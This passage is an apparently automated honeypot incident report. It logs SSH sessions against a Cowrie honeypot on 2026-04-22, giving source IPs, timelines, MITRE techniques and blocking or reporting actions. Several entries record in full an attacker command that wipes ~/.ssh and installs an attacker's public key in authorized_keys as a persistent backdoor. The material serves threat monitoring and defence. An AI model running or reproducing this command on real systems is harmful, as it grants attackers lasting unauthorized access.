| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:21:20` | `cowrie.session.connect` |
| `2026-04-22 18:21:20` | `cowrie.client.version` |
| `2026-04-22 18:21:20` | `cowrie.client.kex` |
| `2026-04-22 18:21:21` | `cowrie.login.success` |
| `2026-04-22 18:21:21` | `cowrie.session.params` |
| `2026-04-22 18:21:21` | `cowrie.command.input` |
| `2026-04-22 18:21:21` | `cowrie.command.failed` |
| `2026-04-22 18:21:21` | `cowrie.log.closed` |
| `2026-04-22 18:21:21` | `cowrie.session.params` |
| `2026-04-22 18:21:21` | `cowrie.command.input` |
| `2026-04-22 18:21:21` | `cowrie.session.file_download` |
| `2026-04-22 18:21:21` | `cowrie.log.closed` |
| `2026-04-22 18:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3606c449a793

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:21 |
| **Last Seen** | 2026-04-22 18:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:21:23` | `cowrie.session.connect` |
| `2026-04-22 18:21:23` | `cowrie.client.version` |
| `2026-04-22 18:21:23` | `cowrie.client.kex` |
| `2026-04-22 18:21:24` | `cowrie.login.success` |
| `2026-04-22 18:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bdeaa505fb

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:22 |
| **Last Seen** | 2026-04-22 18:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:22:07` | `cowrie.session.connect` |
| `2026-04-22 18:22:07` | `cowrie.client.version` |
| `2026-04-22 18:22:07` | `cowrie.client.kex` |
| `2026-04-22 18:22:08` | `cowrie.login.success` |
| `2026-04-22 18:22:08` | `cowrie.session.params` |
| `2026-04-22 18:22:08` | `cowrie.command.input` |
| `2026-04-22 18:22:08` | `cowrie.command.failed` |
| `2026-04-22 18:22:08` | `cowrie.log.closed` |
| `2026-04-22 18:22:08` | `cowrie.session.params` |
| `2026-04-22 18:22:08` | `cowrie.command.input` |
| `2026-04-22 18:22:08` | `cowrie.session.file_download` |
| `2026-04-22 18:22:08` | `cowrie.log.closed` |
| `2026-04-22 18:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6977b6a58d1e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:22 |
| **Last Seen** | 2026-04-22 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:22:10` | `cowrie.session.connect` |
| `2026-04-22 18:22:10` | `cowrie.client.version` |
| `2026-04-22 18:22:10` | `cowrie.client.kex` |
| `2026-04-22 18:22:11` | `cowrie.login.success` |
| `2026-04-22 18:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3dc643b8d78

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:23 |
| **Last Seen** | 2026-04-22 18:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:23:00` | `cowrie.session.connect` |
| `2026-04-22 18:23:00` | `cowrie.client.version` |
| `2026-04-22 18:23:01` | `cowrie.client.kex` |
| `2026-04-22 18:23:02` | `cowrie.login.success` |
| `2026-04-22 18:23:03` | `cowrie.session.params` |
| `2026-04-22 18:23:03` | `cowrie.command.input` |
| `2026-04-22 18:23:03` | `cowrie.command.failed` |
| `2026-04-22 18:23:03` | `cowrie.log.closed` |
| `2026-04-22 18:23:04` | `cowrie.session.params` |
| `2026-04-22 18:23:04` | `cowrie.command.input` |
| `2026-04-22 18:23:05` | `cowrie.session.file_download` |
| `2026-04-22 18:23:05` | `cowrie.log.closed` |
| `2026-04-22 18:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba3cda14263e

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]185` |
| **First Seen** | 2026-04-22 18:23 |
| **Last Seen** | 2026-04-22 18:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:23:09` | `cowrie.session.connect` |
| `2026-04-22 18:23:09` | `cowrie.client.version` |
| `2026-04-22 18:23:09` | `cowrie.client.kex` |
| `2026-04-22 18:23:11` | `cowrie.login.success` |
| `2026-04-22 18:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]185` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8281b3e88048

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:24 |
| **Last Seen** | 2026-04-22 18:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:24:27` | `cowrie.session.connect` |
| `2026-04-22 18:24:27` | `cowrie.client.version` |
| `2026-04-22 18:24:27` | `cowrie.client.kex` |
| `2026-04-22 18:24:27` | `cowrie.login.success` |
| `2026-04-22 18:24:27` | `cowrie.session.params` |
| `2026-04-22 18:24:27` | `cowrie.command.input` |
| `2026-04-22 18:24:27` | `cowrie.command.failed` |
| `2026-04-22 18:24:28` | `cowrie.log.closed` |
| `2026-04-22 18:24:28` | `cowrie.session.params` |
| `2026-04-22 18:24:28` | `cowrie.command.input` |
| `2026-04-22 18:24:28` | `cowrie.session.file_download` |
| `2026-04-22 18:24:28` | `cowrie.log.closed` |
| `2026-04-22 18:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a14da5ad66cc

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:24 |
| **Last Seen** | 2026-04-22 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:24:30` | `cowrie.session.connect` |
| `2026-04-22 18:24:30` | `cowrie.client.version` |
| `2026-04-22 18:24:30` | `cowrie.client.kex` |
| `2026-04-22 18:24:30` | `cowrie.login.success` |
| `2026-04-22 18:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67756f6b1a94

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:27 |
| **Last Seen** | 2026-04-22 18:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:27:37` | `cowrie.session.connect` |
| `2026-04-22 18:27:37` | `cowrie.client.version` |
| `2026-04-22 18:27:37` | `cowrie.client.kex` |
| `2026-04-22 18:27:38` | `cowrie.login.success` |
| `2026-04-22 18:27:38` | `cowrie.session.params` |
| `2026-04-22 18:27:38` | `cowrie.command.input` |
| `2026-04-22 18:27:38` | `cowrie.command.failed` |
| `2026-04-22 18:27:38` | `cowrie.log.closed` |
| `2026-04-22 18:27:38` | `cowrie.session.params` |
| `2026-04-22 18:27:38` | `cowrie.command.input` |
| `2026-04-22 18:27:38` | `cowrie.session.file_download` |
| `2026-04-22 18:27:38` | `cowrie.log.closed` |
| `2026-04-22 18:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3f65ee8000

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:27 |
| **Last Seen** | 2026-04-22 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:27:40` | `cowrie.session.connect` |
| `2026-04-22 18:27:40` | `cowrie.client.version` |
| `2026-04-22 18:27:40` | `cowrie.client.kex` |
| `2026-04-22 18:27:41` | `cowrie.login.success` |
| `2026-04-22 18:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c0666d99cc

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:31 |
| **Last Seen** | 2026-04-22 18:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:31:34` | `cowrie.session.connect` |
| `2026-04-22 18:31:34` | `cowrie.client.version` |
| `2026-04-22 18:31:34` | `cowrie.client.kex` |
| `2026-04-22 18:31:34` | `cowrie.login.success` |
| `2026-04-22 18:31:35` | `cowrie.session.params` |
| `2026-04-22 18:31:35` | `cowrie.command.input` |
| `2026-04-22 18:31:35` | `cowrie.command.failed` |
| `2026-04-22 18:31:35` | `cowrie.log.closed` |
| `2026-04-22 18:31:35` | `cowrie.session.params` |
| `2026-04-22 18:31:35` | `cowrie.command.input` |
| `2026-04-22 18:31:35` | `cowrie.session.file_download` |
| `2026-04-22 18:31:35` | `cowrie.log.closed` |
| `2026-04-22 18:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce24cc3f974c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]66` |
| **First Seen** | 2026-04-22 18:31 |
| **Last Seen** | 2026-04-22 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:31:37` | `cowrie.session.connect` |
| `2026-04-22 18:31:37` | `cowrie.client.version` |
| `2026-04-22 18:31:37` | `cowrie.client.kex` |
| `2026-04-22 18:31:37` | `cowrie.login.success` |
| `2026-04-22 18:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]66` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5343984f5ea2

| Field | Detail |
|---|---|
| **Source IP** | `115.236.181[.]242` |
| **First Seen** | 2026-04-22 18:38 |
| **Last Seen** | 2026-04-22 18:43 |
| **Session Duration** | 347s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:38:01` | `cowrie.session.connect` |
| `2026-04-22 18:38:01` | `cowrie.client.version` |
| `2026-04-22 18:38:01` | `cowrie.client.kex` |
| `2026-04-22 18:38:49` | `cowrie.login.success` |
| `2026-04-22 18:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.236.181[.]242` to AbuseIPDB if not already reported
- [ ] Block `115.236.181[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac18db0bb095

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:43 |
| **Last Seen** | 2026-04-22 18:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:43:26` | `cowrie.session.connect` |
| `2026-04-22 18:43:26` | `cowrie.client.version` |
| `2026-04-22 18:43:27` | `cowrie.client.kex` |
| `2026-04-22 18:43:28` | `cowrie.login.success` |
| `2026-04-22 18:43:29` | `cowrie.session.params` |
| `2026-04-22 18:43:29` | `cowrie.command.input` |
| `2026-04-22 18:43:29` | `cowrie.command.failed` |
| `2026-04-22 18:43:29` | `cowrie.log.closed` |
| `2026-04-22 18:43:30` | `cowrie.session.params` |
| `2026-04-22 18:43:30` | `cowrie.command.input` |
| `2026-04-22 18:43:31` | `cowrie.session.file_download` |
| `2026-04-22 18:43:31` | `cowrie.log.closed` |
| `2026-04-22 18:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f2809987d1

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:43 |
| **Last Seen** | 2026-04-22 18:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:43:35` | `cowrie.session.connect` |
| `2026-04-22 18:43:35` | `cowrie.client.version` |
| `2026-04-22 18:43:35` | `cowrie.client.kex` |
| `2026-04-22 18:43:37` | `cowrie.login.success` |
| `2026-04-22 18:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8917ef6f1e

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:44 |
| **Last Seen** | 2026-04-22 18:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:44:35` | `cowrie.session.connect` |
| `2026-04-22 18:44:35` | `cowrie.client.version` |
| `2026-04-22 18:44:35` | `cowrie.client.kex` |
| `2026-04-22 18:44:36` | `cowrie.login.success` |
| `2026-04-22 18:44:37` | `cowrie.session.params` |
| `2026-04-22 18:44:37` | `cowrie.command.input` |
| `2026-04-22 18:44:37` | `cowrie.command.failed` |
| `2026-04-22 18:44:38` | `cowrie.log.closed` |
| `2026-04-22 18:44:38` | `cowrie.session.params` |
| `2026-04-22 18:44:38` | `cowrie.command.input` |
| `2026-04-22 18:44:39` | `cowrie.session.file_download` |
| `2026-04-22 18:44:39` | `cowrie.log.closed` |
| `2026-04-22 18:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608646722665

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:44 |
| **Last Seen** | 2026-04-22 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:44:43` | `cowrie.session.connect` |
| `2026-04-22 18:44:43` | `cowrie.client.version` |
| `2026-04-22 18:44:43` | `cowrie.client.kex` |
| `2026-04-22 18:44:45` | `cowrie.login.success` |
| `2026-04-22 18:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0e2c780b26

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:45 |
| **Last Seen** | 2026-04-22 18:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:45:50` | `cowrie.session.connect` |
| `2026-04-22 18:45:50` | `cowrie.client.version` |
| `2026-04-22 18:45:50` | `cowrie.client.kex` |
| `2026-04-22 18:45:52` | `cowrie.login.success` |
| `2026-04-22 18:45:53` | `cowrie.session.params` |
| `2026-04-22 18:45:53` | `cowrie.command.input` |
| `2026-04-22 18:45:53` | `cowrie.command.failed` |
